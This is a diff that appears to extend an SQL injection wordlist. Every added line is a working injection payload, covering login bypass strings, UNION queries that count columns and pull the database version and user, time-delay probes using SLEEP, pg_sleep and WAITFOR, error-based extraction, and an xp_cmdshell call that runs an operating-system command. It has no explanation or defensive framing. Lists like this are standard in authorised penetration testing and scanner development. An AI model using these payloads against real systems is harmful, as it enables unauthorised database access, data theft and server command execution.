@@ -3,4 +3,27 @@
 admin'--
 ') OR ('1'='1
 1 UNION SELECT NULL--
-
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1'--
+" OR "a"="a
+admin' OR 1=1--
+admin" OR 1=1--
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+1 UNION ALL SELECT NULL--
+' UNION SELECT @@version--
+' UNION SELECT @@version,NULL--
+' UNION SELECT null,@@version--
+' UNION SELECT version()--
+1' UNION SELECT user()--
+1' UNION SELECT current_user--
+'; EXEC xp_cmdshell('dir');--
+'; WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)--
+1'||pg_sleep(5)--
+' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))--
+' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT version FROM v$instance))--
